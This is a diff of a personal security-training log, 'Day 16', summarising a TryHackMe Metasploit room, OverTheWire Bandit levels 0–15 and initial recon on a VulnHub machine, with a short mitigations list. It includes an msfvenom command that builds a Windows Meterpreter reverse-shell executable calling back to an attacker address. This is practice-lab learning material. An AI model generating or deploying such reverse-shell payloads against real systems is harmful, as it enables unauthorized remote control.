@@ -1,28 +1,30 @@
-# 🚀 Day 16: Metasploit | Bandit (0–15) | VulnHub Scriptkiddie
+🚀 Day 16: Metasploit | Bandit (0–15) | VulnHub Scriptkiddie
+📌 Overview
 
----
+Day 16 was a packed day of learning and practice across three platforms:
 
-## 📌 Overview
-Day 16 was a packed day of learning and practice across three platforms:  
+TryHackMe Metasploit Room — Focused on scanning, exploitation, Metasploit database, msfvenom payloads.
 
-1. **TryHackMe Metasploit Room** — Focused on scanning, exploitation, Metasploit database, msfvenom payloads.  
-2. **OverTheWire Bandit (levels 0 → 15)** — Strengthened Linux fundamentals through practical challenges.  
-3. **VulnHub: Funbox Scriptkiddie** — Beginner-friendly CTF-style machine, performed initial recon and setup.  
+OverTheWire Bandit (levels 0 → 15) — Strengthened Linux fundamentals through practical challenges.
 
----
+VulnHub: Funbox Scriptkiddie — Beginner-friendly CTF-style machine, performed initial recon and setup.
 
-## 🔹 TryHackMe — Metasploit Room
+🔹 TryHackMe — Metasploit Room
+Key Topics
 
-### Key Topics
-- Scanning targets with Metasploit  
-- Using the Metasploit database (`msfdb`)  
-- Conducting vulnerability scans  
-- Exploiting vulnerable services  
-- Generating payloads with `msfvenom`  
-- Obtaining a Meterpreter session  
+Scanning targets with Metasploit
 
-### Important Commands
-```bash
+Using the Metasploit database (msfdb)
+
+Conducting vulnerability scans
+
+Exploiting vulnerable services
+
+Generating payloads with msfvenom
+
+Obtaining a Meterpreter session
+
+Important Commands
 # Start and initialize the Metasploit database
 msfdb init
 
@@ -51,16 +53,22 @@ run
 
 # Generate payload with msfvenom
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=4444 -f exe > shell.exe
----
 
-###🔹 OverTheWire — Bandit (Level 0 → 15)
+🔹 OverTheWire — Bandit (Level 0 → 15)
 Focus Areas
+
 SSH basics
+
 File permissions
+
 Hidden files & directories
+
 Encodings (base64, hex, gzip, bzip2)
+
 Cron jobs
+
 Password retrieval logic
+
 Important Commands
 # SSH into Bandit
 ssh bandit0@bandit.labs.overthewire.org -p 2220
@@ -91,9 +99,15 @@ nc <host> <port>
 
 🔹 VulnHub — Funbox: Scriptkiddie
 Setup
+
 Downloaded & imported Funbox11.ova
+
 Added entry to /etc/hosts:
+
 funbox11  <target_ip>
+
+
+Works better with VirtualBox
 
 Initial Recon
 # Host discovery
@@ -111,10 +125,18 @@ echo "<target_ip> funbox11" | sudo tee -a /etc/hosts
 🔑 Key Takeaways
 
 Metasploit is more than just an exploitation tool — its database & msfvenom features make it a full pentest framework.
+
 Bandit reinforces Linux fundamentals that are critical in real-world scenarios.
+
 VulnHub challenges simulate attacker workflows and build applied experience.
-<img width="1920" height="1080" alt="Screenshot from 2025-08-24 14-49-24" src="https://github.com/user-attachments/assets/011b7e2b-9d9b-4540-8e3a-b2070c93229e" />
-<img width="1920" height="1080" alt="Screenshot from 2025-08-24 19-50-06" src="https://github.com/user-attachments/assets/c0c080de-fe2d-4a44-b07e-df4a64d770a8" />
-<img width="1920" height="1080" alt="Screenshot from 2025-08-24 21-33-34" src="https://github.com/user-attachments/assets/32246813-1829-454c-9580-eee074bb433f" />
-<img width="1920" height="1080" alt="Screenshot from 2025-08-24 19-50-46" src="https://github.com/user-attachments/assets/4aabca73-9b35-4310-9f56-ecf8a11ee4f8" />
+
+🛡️ High-Level Mitigations
+
+Keep systems patched (avoid unpatched services like MS08-067 / MS17-010).
+
+Restrict unnecessary services and enforce least privilege.
+
+Secure SSH: disable root login, prefer key-based authentication.
+
+Apply defense-in-depth to minimize exposed attack surfaces.
 
